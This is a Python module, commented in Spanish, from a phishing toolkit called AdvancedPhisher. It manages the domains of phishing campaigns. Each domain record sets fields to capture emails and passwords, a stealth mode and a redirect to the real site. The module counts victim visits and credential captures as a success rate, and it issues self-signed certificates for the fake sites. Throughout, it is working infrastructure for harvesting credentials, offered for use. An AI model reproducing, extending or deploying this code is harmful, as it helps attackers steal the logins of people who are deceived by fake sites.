#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Domain Manager - Gestión avanzada de dominios y SSL
Parte del framework AdvancedPhisher
"""

import os
import json
import ssl
import socket
import subprocess
import requests
from pathlib import Path
from datetime import datetime, timedelta
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from colorama import Fore, Style

class DomainManager:
    def __init__(self, config_path=None):
        self.base_dir = Path(__file__).parent.parent
        self.domains_file = self.base_dir / "domains" / "domains.json"
        self.certs_dir = self.base_dir / "certs"
        self.certs_dir.mkdir(exist_ok=True)
        
        self.domains = self.load_domains()
        
    def load_domains(self):
        """Cargar configuración de dominios"""
        try:
            with open(self.domains_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except FileNotFoundError:
            return {}
        except json.JSONDecodeError:
            print(f"{Fore.RED}Error: Archivo de dominios corrupto{Style.RESET_ALL}")
            return {}
            
    def save_domains(self):
        """Guardar configuración de dominios"""
        try:
            with open(self.domains_file, 'w', encoding='utf-8') as f:
                json.dump(self.domains, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"{Fore.RED}Error guardando dominios: {str(e)}{Style.RESET_ALL}")
            return False
            
    def add_domain(self, name, domain, template, ssl_enabled=True, port=443):
        """Agregar nuevo dominio"""
        self.domains[name] = {
            "domain": domain,
            "ssl": ssl_enabled,
            "active": True,
            "template": template,
            "port": port,
            "redirect_url": f"https://{domain.replace('-', '').replace('space', 'com')}",
            "capture_fields": ["email", "password"],
            "stealth_mode": True,
            "user_agent_filter": False,
            "geo_filter": False,
            "description": f"Phishing campaign for {name}",
            "created_at": datetime.now().isoformat(),
            "last_used": None,
            "stats": {
                "visits": 0,
                "captures": 0,
                "success_rate": 0.0
            }
        }
        return self.save_domains()
        
    def remove_domain(self, name):
        """Eliminar dominio"""
        if name in self.domains:
            del self.domains[name]
            return self.save_domains()
        return False
        
    def activate_domain(self, name):
        """Activar dominio"""
        if name in self.domains:
            self.domains[name]['active'] = True
            return self.save_domains()
        return False
        
    def deactivate_domain(self, name):
        """Desactivar dominio"""
        if name in self.domains:
            self.domains[name]['active'] = False
            return self.save_domains()
        return False
        
    def get_active_domains(self):
        """Obtener dominios activos"""
        return {k: v for k, v in self.domains.items() if v.get('active', False)}
        
    def test_domain_connectivity(self, domain, port=80, timeout=5):
        """Probar conectividad a un dominio"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((domain, port))
            sock.close()
            return result == 0
        except Exception:
            return False
            
    def check_ssl_certificate(self, domain, port=443):
        """Verificar certificado SSL de un dominio"""
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    return {
                        'valid': True,
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': cert['version'],
                        'serial_number': cert['serialNumber'],
                        'not_before': cert['notBefore'],
                        'not_after': cert['notAfter']
                    }
        except Exception as e:
            return {
                'valid': False,
                'error': str(e)
            }
            
    def generate_self_signed_cert(self, domain, key_size=2048, validity_days=365):
        """Generar certificado SSL auto-firmado"""
        try:
            # Generar clave privada
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=key_size,
            )
            
            # Crear certificado
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
                x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Research"),
                x509.NameAttribute(NameOID.COMMON_NAME, domain),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.utcnow()
            ).not_valid_after(
                datetime.utcnow() + timedelta(days=validity_days)
            ).add_extension(
                x509.SubjectAlternativeName([
                    x509.DNSName(domain),
                ]),
                critical=False,
            ).sign(private_key, hashes.SHA256())
            
            # Guardar archivos
            cert_path = self.certs_dir / f"{domain}.crt"
            key_path = self.certs_dir / f"{domain}.key"
            
            # Escribir certificado
            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
                
            # Escribir clave privada
            with open(key_path, "wb") as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ))
                
            return {
                'success': True,
                'cert_path': str(cert_path),
                'key_path': str(key_path)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }
            
    def get_domain_stats(self, name):
        """Obtener estadísticas de un dominio"""
        if name in self.domains:
            return self.domains[name].get('stats', {})
        return {}
        
    def update_domain_stats(self, name, visits=0, captures=0):
        """Actualizar estadísticas de un dominio"""
        if name in self.domains:
            stats = self.domains[name].get('stats', {})
            stats['visits'] = stats.get('visits', 0) + visits
            stats['captures'] = stats.get('captures', 0) + captures
            
            if stats['visits'] > 0:
                stats['success_rate'] = (stats['captures'] / stats['visits']) * 100
            else:
                stats['success_rate'] = 0.0
                
            self.domains[name]['stats'] = stats
            self.domains[name]['last_used'] = datetime.now().isoformat()
            return self.save_domains()
        return False
        
    def get_domain_info(self, name):
        """Obtener información completa de un dominio"""
        if name in self.domains:
            domain_info = self.domains[name].copy()
            
            # Agregar información de conectividad
            domain_info['connectivity'] = self.test_domain_connectivity(
                domain_info['domain'], 
                domain_info.get('port', 80)
            )
            
            # Agregar información SSL si está habilitado
            if domain_info.get('ssl', False):
                domain_info['ssl_info'] = self.check_ssl_certificate(
                    domain_info['domain'],
                    domain_info.get('port', 443)
                )
                
            return domain_info
        return None
        
    def list_domains(self, active_only=False):
        """Listar dominios con información básica"""
        domains_list = []
        
        for name, info in self.domains.items():
            if active_only and not info.get('active', False):
                continue
                
            domains_list.append({
                'name': name,
                'domain': info['domain'],
                'active': info.get('active', False),
                'ssl': info.get('ssl', False),
                'template': info.get('template', 'unknown'),
                'visits': info.get('stats', {}).get('visits', 0),
                'captures': info.get('stats', {}).get('captures', 0),
                'success_rate': info.get('stats', {}).get('success_rate', 0.0)
            })
            
        return domains_list
        
    def export_domains(self, file_path):
        """Exportar configuración de dominios"""
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(self.domains, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"{Fore.RED}Error exportando dominios: {str(e)}{Style.RESET_ALL}")
            return False
            
    def import_domains(self, file_path, merge=True):
        """Importar configuración de dominios"""
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                imported_domains = json.load(f)
                
            if merge:
                self.domains.update(imported_domains)
            else:
                self.domains = imported_domains
                
            return self.save_domains()
        except Exception as e:
            print(f"{Fore.RED}Error importando dominios: {str(e)}{Style.RESET_ALL}")
            return False